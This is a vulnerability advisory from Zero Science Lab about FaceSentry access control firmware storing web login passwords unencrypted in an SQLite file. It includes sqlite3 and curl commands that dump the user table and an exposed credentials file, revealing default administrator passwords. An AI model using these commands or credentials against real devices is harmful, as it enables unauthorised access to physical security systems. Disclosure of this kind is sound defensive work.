@@ -1,0 +1,67 @@
+
+FaceSentry Access Control System 6.4.8 Cleartext Password Storage
+
+
+Vendor: iWT Ltd.
+Product web page: http://www.iwt.com.hk
+Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
+                  Firmware 5.7.2 build 568 (Algorithm A14)
+                  Firmware 5.7.0 build 539 (Algorithm A14)
+
+Summary: FaceSentry 5AN is a revolutionary smart identity
+management appliance that offers entry via biometric face
+identification, contactless smart card, staff ID, or QR-code.
+The QR-code upgrade allows you to share an eKey with guests
+while you're away from your Office and monitor all activity
+via the web administration tool. Powered by standard PoE
+(Power over Ethernet), FaceSEntry 5AN can be installed in
+minutes with only 6 screws. FaceSentry 5AN is a true enterprise
+grade access control or time-and-attendance appliance.
+
+Desc: The credentials used for accessing the web front end are
+stored unencrypted on the device in /faceGuard/database/FaceSentryWeb.sqlite.
+
+Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
+           Linux 3.4.113-sun8i (armv7l)
+           PHP/7.0.30-0ubuntu0.16.04.1
+           PHP/7.0.22-0ubuntu0.16.04.1
+           lighttpd/1.4.35
+           Armbian 5.38
+           Sunxi Linux (sun8i generation)
+           Orange Pi PC +
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5529
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5529.php
+
+
+28.05.2019
+
+--
+
+
+$ sqlite3 FaceSentryWeb.sqlite
+SQLite version 3.14.2 2016-09-12 18:50:49
+Enter ".help" for usage hints.
+sqlite> .tables
+TPermission                            
+TUserFunctionPermissionGroup           
+TUserFunctionPermissionGroup_Permission
+TWebUser                               
+sqlite> select * from TWebUser;
+administrator|Default Sys. Admin|Admin|123456|Eng|Active|administrator|2019-05-28 11:03:57
+user|Defalt Sys. User|UserGrp|123|Eng|Active|administrator|2013-01-01 00:00:00
+admin||Admin|123|zh-TW|Active|administrator|2015-11-23 03:28:10
+sqlite> .q
+
+$ curl http://192.168.11.1/database/insert_db.txt
+Insert into TWebUser(fUserID,fUserFunctionPermissionGroupID,fUserPassword,fUserLanguage,fStatus) VALUES('administrator','Admin','123456','Eng','Active');
+
+Insert into TUserFunctionPermissionGroup (fUserFunctionPermissionGroupID,fUserFunctionPermissionGroupDescription) VALUES('Admin','Administrator');
+
+--phpinfo()--
+http://192.168.11.1/info.php
